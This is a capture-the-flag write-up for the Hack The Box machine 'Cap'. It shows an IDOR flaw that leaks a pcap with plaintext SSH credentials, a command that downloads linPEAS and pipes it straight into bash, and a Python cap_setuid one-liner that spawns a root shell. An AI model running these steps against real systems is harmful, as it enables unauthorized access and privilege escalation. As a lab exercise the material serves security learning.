# HTB Write-up: Cap

## Summary

Cap is an easy Linux machine that involves identifying misconfigured file capabilities and exploiting them to escalate privileges. The initial foothold is obtained by analyzing downloadable pcap files and discovering credentials through **IDOR** (Insecure Direct Object Reference) vulnerabilities, and after that we proceed to do some **Privilege Escalation** on Linux using LinPEAS.

---

## Nmap

We begin by scanning all ports and running default scripts to detect services:

```bash
nmap -p- -sV -sC -Pn --min-rate 1000 10.10.10.245
```

### Ports Discovered

- **21/tcp** – FTP (vsftpd 3.0.3)
- **22/tcp** – SSH (OpenSSH 8.2p1)
- **80/tcp** – HTTP (gunicorn, a Python WSGI HTTP server). The web page served is called “Security Dashboard”.

---

## Enumeration

- FTP: Anonymous login not allowed.
- Web: The dashboard reveals a few different pages.
  - **IP Config**: Shows output from `ifconfig`.
  - **Network Status**: Shows `netstat` output.
  - **Security Snapshot**: Loads a page after a short delay and offers a **.pcap** file for download.

The **Security Snapshot** page has a predictable URL structure: `http://10.10.10.245/data/10`. Trying lower IDs (e.g., `0`) reveals other snapshots—classic **IDOR vulnerability**.

By downloading and inspecting one of the earlier packet captures (PCAPs) in Wireshark, I discovered plaintext credentials:

```
Username: nathan
Password: Buck3tH4TF0RM3!
```

Tried SSH using those credentials:

```bash
ssh nathan@10.10.10.245
```

Login successful.

```bash
nathan@cap:~$ ls
snap  user.txt
nathan@cap:~$ cat user.txt
<user flag>
```

---

## Privilege Escalation

To enumerate the system for potential privilege escalation paths, I used **linPEAS**.

From my local machine (10.10.14.24):

```bash
sudo python3 -m http.server 8000
```

On Cap:

```bash
curl http://10.10.14.24:8000/linpeas.sh | bash
```

### Interesting Finding

On the LinPEAS report in the Capabilities section we find:

```bash
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                          
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip                                              
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

We also could have used getcap command to check if there file capabilities on the machine, which are special permissions that can allow binaries to perform privileged actions without being root.

```bash
getcap -r / 2>/dev/null
```

output:
```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

- `cap_setuid` – This allows the binary (in this case, Python) to change the user ID without needing sudo.
- `cap_net_bind_service` – This allows binding to low-numbered ports (not relevant here).
- `+eip` – "Effective, Inheritable, Permitted" – Python can use these capabilities.


### Exploitation

After some research on /usr/bin/python3.8, I found by running the following command, we can escalate to root:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- `os.setuid(0)` — Sets the UID of the process to 0 (root).
- `os.system("/bin/bash")` — Spawns a shell with root privileges.

Since Python has the cap_setuid capability, it can switch to UID 0 (root). Normally, you would need sudo for that, but this bypasses that restriction.
So, by combining os.setuid(0) and opening a shell, you get a root shell without knowing the root password.

### Final Steps

```bash
root@cap:/root# cat root.txt
<root flag>
```

---

## Conclusion

Cap demonstrates the importance of validating access controls (to prevent IDOR) and avoiding insecure use of Linux capabilities. Granting Python CAP_SETUID can unintentionally allow privilege escalation.